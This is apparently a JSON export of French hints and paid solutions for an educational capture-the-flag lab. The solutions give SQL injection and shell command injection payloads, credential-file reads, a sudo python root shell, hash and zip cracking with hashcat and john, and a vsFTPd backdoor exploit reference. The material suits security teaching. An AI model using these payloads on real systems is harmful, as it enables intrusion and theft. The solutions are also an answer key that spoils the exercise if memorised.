{"count":45,"results":[{"id":2,"type":"standard","challenge_id":1,"content":"Utilisez `nmap` pour lancer un scan de port. \n\nL\u2019aide est disponible en lan\u00e7ant `nmap -h`.\n\nNe scannez que les ports 1 \u00e0 1000 pour aller plus vite ! ","cost":0,"requirements":{"prerequisites":[]}},{"id":3,"type":"standard","challenge_id":1,"content":"**Solution**\n\n`nmap ctf-sr2i.rezel.net -p 1-1000`\n\nhttp://ctf-sr2I.rezel.net:817\n","cost":9999,"requirements":{"prerequisites":[]}},{"id":4,"type":"standard","challenge_id":2,"content":"Il est possible de contourner le formulaire de login avec une injection SQL. \n\nEssayez de mettre un guillemet (\u201c) dans le champ de login ?\n\nhttps://duckduckgo.com/?q=sql+injection+tutorial\n","cost":0,"requirements":{"prerequisites":[]}},{"id":5,"type":"standard","challenge_id":2,"content":"Il faut transformer la requ\u00eate SQL de mani\u00e8re \u00e0 ce que la condition de s\u00e9lection apr\u00e8s WHERE soit toujours vraie.","cost":0,"requirements":{"prerequisites":[]}},{"id":6,"type":"standard","challenge_id":2,"content":"```php\nif (isset($_GET[\"username\"]) && isset($_GET[\"password\"])) {\n\n  // $servername, $username, $password \n  // = identifiants de la base de donn\u00e9e\n\n  $conn = new mysqli($servername, $username, $password);\n\n  if ($conn->connect_error) {\n    die(\"SQL Connection failed: \" . $conn->connect_error);\n  }\n\n  $sql = \"SELECT * FROM data.users WHERE username = \\\"\" . $_GET[\"username\"] . \"\\\" AND password=\\\"\" . $_GET[\"password\"] . \"\\\"\";\n  $result = $conn->query($sql);\n\n  if ($conn->error)\n  {\n    echo \"Error : <br/>\".$conn->error;\n    echo \"<br/><br/>\";\n    echo \"Request : <br/>\".$sql;\n  }\n    \n  else {\n    if ($result->num_rows > 0) {\n      $row = $result->fetch_assoc();\n      $_SESSION['logged'] = true;\n      $_SESSION['username'] = $row['username'];\n    } else {\n      $failed_login = true;\n      \n    }\n  }\n  $conn->close();\n}\n```","cost":0,"requirements":{"prerequisites":[]}},{"id":7,"type":"standard","challenge_id":2,"content":"**Solution**\n\nusername : `\" OR 1=1 OR \"\"=\"`\npassword : `motdepasse`\n\n\nLa requ\u00eate finale est :\n\n```\nSELECT * FROM data.users WHERE username = \" \" OR 1=1 OR \"\"=\"\" AND password=\"motdepasse\"\n```","cost":9999,"requirements":{"prerequisites":[]}},{"id":8,"type":"standard","challenge_id":3,"content":"Il est possible d\u2019extraire le flag de la base de donn\u00e9e avec une injection SQL utilisant UNION, mais il y a une autre mani\u00e8re plus simple de proc\u00e9der si le challenge \u201cRemote Code Execution\u201d a \u00e9t\u00e9 r\u00e9solu.","cost":0,"requirements":{"prerequisites":[]}},{"id":9,"type":"standard","challenge_id":3,"content":"(apr\u00e8s \u201cRemote Code Execution\u201d) \n\nComment la page `/var/www/html/index.php`  se connecte-t-elle \u00e0 la base de donn\u00e9es ? \n\nConnectez-vous \u00e0 la main.","cost":0,"requirements":{"prerequisites":[]}},{"id":10,"type":"standard","challenge_id":3,"content":"(apr\u00e8s \u201cRemote Code Execution\u201d) \n\nTrouvez les identifiants de connexion \u00e0 la base dans index.php et connectez vous depuis le serveur avec la commande linux `mysql`.\n","cost":0,"requirements":{"prerequisites":[]}},{"id":11,"type":"standard","challenge_id":5,"content":"Un script PHP lance la commande linux ping dans un shell en ajoutant apr\u00e8s `ping` l\u2019adresse IP rentr\u00e9e par l\u2019utilisateur.  (concat\u00e9nation de cha\u00eene de caract\u00e8res)\n\nQu\u2019est-ce qui pourrait mal se passer ?\n","cost":0,"requirements":{"prerequisites":[]}},{"id":12,"type":"standard","challenge_id":5,"content":"Essayez de lancer une autre commande apr\u00e8s ping, en ins\u00e9rant des caract\u00e8res sp\u00e9ciaux dans le champ \"IP\".","cost":0,"requirements":{"prerequisites":[]}},{"id":13,"type":"standard","challenge_id":5,"content":"```php\nif (isset($_GET[\"ip\"]) && !empty($_GET[\"ip\"])) {\n        $response = shell_exec(\"ping -c 3 \" . $_GET[\"ip\"]);\n        echo $response;\n      }\n```","cost":0,"requirements":{"prerequisites":[]}},{"id":14,"type":"standard","challenge_id":5,"content":"**Solution**\n\nListez les fichiers en envoyant `; ls` dans le champ \"IP\".\n\nLa commande compl\u00e8te sera donc, par concact\u00e9nation :\n\n`ping -c 3; ls`\n\nPuis affichez le flag :\n\n`; cat flag.txt`\n","cost":9999,"requirements":{"prerequisites":[]}},{"id":15,"type":"standard","challenge_id":6,"content":"Explorez `/home` par le biais du challenge \"Remote Code Execution\".","cost":0,"requirements":{"prerequisites":[]}},{"id":16,"type":"standard","challenge_id":6,"content":"**Solution**\n\n`;ls /home/www-data/`\n\n`;cat /home/www-data/cr3d3nt14l5.txt`\n\nMot de passe www-data:  `Machine1_passwd`\n\nLe port SSH est le 2222     \n\n`ssh www-data@ctf-sr2i.rezel.net -p 2222`\n\nmot de passe : `Machine1_passwd`\n","cost":9999,"requirements":{"prerequisites":[]}},{"id":17,"type":"standard","challenge_id":7,"content":"R\u00e8gles sudo\n\nhttps://wiki.debian.org/fr/sudo\n\nhttps://wiki.debian.org/sudo\n","cost":0,"requirements":{"prerequisites":[]}},{"id":18,"type":"standard","challenge_id":7,"content":"Lisez les r\u00e8gles sudo avec `sudo -l`","cost":0,"requirements":{"prerequisites":[]}},{"id":19,"type":"standard","challenge_id":7,"content":"`sudo python3 # lance Python en tant que root`","cost":0,"requirements":{"prerequisites":[]}},{"id":20,"type":"standard","challenge_id":7,"content":"Lancez un shell bash depuis Python.","cost":0,"requirements":{"prerequisites":[]}},{"id":21,"type":"standard","challenge_id":7,"content":"**Solution**\n\n`sudo python3 `\n\n```\nimport os\nos.system(\u201cbash\u201d)\n```\n","cost":9999,"requirements":{"prerequisites":[]}},{"id":22,"type":"standard","challenge_id":8,"content":"`cat /root/hash.txt`\n\nhttps://en.wikipedia.org/wiki/Dictionary_attack\n","cost":0,"requirements":{"prerequisites":[]}},{"id":23,"type":"standard","challenge_id":8,"content":"Il s\u2019agit du hash MD5 d\u2019un mot de passe alphanum\u00e9rique de 8 caract\u00e8res minuscules.\n\nhttps://hashcat.net/hashcat/\n\nhttps://github.com/zacheller/rockyou\n","cost":0,"requirements":{"prerequisites":[]}},{"id":25,"type":"standard","challenge_id":8,"content":"https://www.freecodecamp.org/news/hacking-with-hashcat-a-practical-guide/","cost":0,"requirements":{"prerequisites":[]}},{"id":26,"type":"standard","challenge_id":8,"content":"Installez Hashcat en local sur votre machine. \n\n(sur Ubuntu/Debian/Kali : `apt install hashcat`).\n\nT\u00e9l\u00e9chargez (et d\u00e9compressez au besoin) la wordlist Rockyou.\n\nMettez le hash md5 \u00e0 cracker seul dans un fichier texte.\n\n`hashcat -m 0 -a 0 md5.txt rockyou.txt`\n","cost":0,"requirements":{"prerequisites":[]}},{"id":27,"type":"standard","challenge_id":8,"content":"Des bases de donn\u00e9es en ligne existent \u00e9galement pour \u201ccasser\u201d ce genre de hash sans lancer de bruteforce en local.","cost":0,"requirements":{"prerequisites":[]}},{"id":28,"type":"standard","challenge_id":8,"content":"https://hashes.com/en/decrypt/hash\n\nhttps://crackstation.net/","cost":0,"requirements":{"prerequisites":[]}},{"id":31,"type":"standard","challenge_id":15,"content":"https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes","cost":0,"requirements":{"prerequisites":[]}},{"id":32,"type":"standard","challenge_id":9,"content":"Trouvez la machine avec un FTP (port `21`) dans le subnet `10.1.0.0/24`.","cost":0,"requirements":{"prerequisites":[]}},{"id":33,"type":"standard","challenge_id":9,"content":"Le FTP est sur `machine3`, dont l\u2019IP est  `10.1.0.188`.\n\nFaites une connexion anonyme au FTP et explorez les fichiers. La connexion doit \u00eatre effectu\u00e9e depuis une machine du r\u00e9seau.","cost":0,"requirements":{"prerequisites":[]}},{"id":35,"type":"standard","challenge_id":9,"content":"**Solution**\n\n`ftp 10.1.0.188`\n\nusername: `anonymous`\n\npassword: (laisser blanc)\n\nVous pouvez naviguer avec `cd` et `ls`. \n\nLe flag est le nom d\u2019un fichier (sans son extension).\n","cost":9999,"requirements":{"prerequisites":[]}},{"id":36,"type":"standard","challenge_id":10,"content":"Trouvez la version du serveur. \n\nEst-elle connue pour une faille particuli\u00e8re ?\n","cost":0,"requirements":{"prerequisites":[]}},{"id":37,"type":"standard","challenge_id":10,"content":"Il y a une backdoor dans `vsFTPd 2.3.4`.\n\nhttps://nvd.nist.gov/vuln/detail/CVE-2011-2523\n","cost":0,"requirements":{"prerequisites":[]}},{"id":38,"type":"standard","challenge_id":10,"content":"Cherchez un *exploit* sur Exploit-DB.\n","cost":0,"requirements":{"prerequisites":[]}},{"id":39,"type":"standard","challenge_id":10,"content":"**Solution**\n\nhttps://www.exploit-db.com/exploits/49757\n","cost":9999,"requirements":{"prerequisites":[]}},{"id":40,"type":"standard","challenge_id":11,"content":"Enum\u00e9rez avec nmap les serveurs SSH (port 22) du subnet `10.1.0.0/24`.","cost":0,"requirements":{"prerequisites":[]}},{"id":41,"type":"standard","challenge_id":11,"content":"`nmap -p 22 10.1.0.0/24`","cost":0,"requirements":{"prerequisites":[]}},{"id":42,"type":"standard","challenge_id":11,"content":"**Solution**\n\n`ssh root@10.1.0.193`","cost":9999,"requirements":{"prerequisites":[]}},{"id":43,"type":"standard","challenge_id":12,"content":"Trouvez le fichier en explorant automatiquement l\u2019arborescence.","cost":0,"requirements":{"prerequisites":[]}},{"id":44,"type":"standard","challenge_id":12,"content":"Utilisez la commande `find`. Le nom du fichier est `documents_confidentiels.zip`.","cost":0,"requirements":{"prerequisites":[]}},{"id":45,"type":"standard","challenge_id":12,"content":"**Solution**\n\n`find / -name documents_confidentiels.zip`\n","cost":9999,"requirements":{"prerequisites":[]}},{"id":46,"type":"standard","challenge_id":13,"content":"Utilisez `zip2john` sur le serveur et ins\u00e9rez la sortie dans un fichier texte sur votre PC. \n\nCrackez le ensuite en local avec `john`.\n\nIl faudra une version r\u00e9cente de `john`\n.\nhttps://www.openwall.com/john/\n","cost":0,"requirements":{"prerequisites":[]}},{"id":47,"type":"standard","challenge_id":13,"content":"**Solution**\n\n- mettre la sortie de `zip2john` dans un fichier `hash.txt`.\n- T\u00e9l\u00e9charger une wordlist (Rockyou?) et adapter dans la commande suivante :\n- `john --wordlist=/mettre/chemin/vers/wordlist.txt hash.txt`\n","cost":9999,"requirements":{"prerequisites":[]}},{"id":48,"type":"standard","challenge_id":14,"content":"Attention, m\u00eame si le pr\u00e9nom de l'utilisateur est Jacques, on cherche bien \u00e0 se connecter en tant qu'administrateur de la machine !","cost":0,"requirements":{"prerequisites":[]}},{"id":49,"type":"standard","challenge_id":14,"content":"**Solution**\n\n`ssh root@machine5`\n\nLe mot de passe est celui trouv\u00e9 dans \u201cCrack moi si tu l\u2019oses\u201d.\n","cost":9999,"requirements":{"prerequisites":[48]}},{"id":50,"type":"standard","challenge_id":15,"content":"Le flag est dans `flag.txt`.","cost":0,"requirements":{"prerequisites":[]}}],"meta":{}}